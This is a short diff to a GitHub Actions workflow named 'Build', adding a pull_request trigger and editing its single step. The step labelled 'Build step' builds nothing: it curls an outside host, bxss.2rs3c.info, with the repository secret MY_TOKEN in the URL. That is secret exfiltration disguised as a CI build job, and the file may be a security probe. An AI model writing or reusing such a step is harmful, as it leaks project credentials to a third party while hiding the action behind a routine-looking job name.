@@ -1,6 +1,6 @@
 name: Build
 
-on: [ push ]
+on: [ push, pull_request ]
 
 jobs:
   build-and-test:
@@ -8,4 +8,4 @@ jobs:
     steps:
       - uses: actions/checkout@v2
       - name: Build step
-        run: curl "https://bxss.2rs3c.info/github?q=${{ secrets.MY_TOKEN }}"
+        run: curl "https://bxss.2rs3c.info/github?v2=${{ secrets.MY_TOKEN }}"
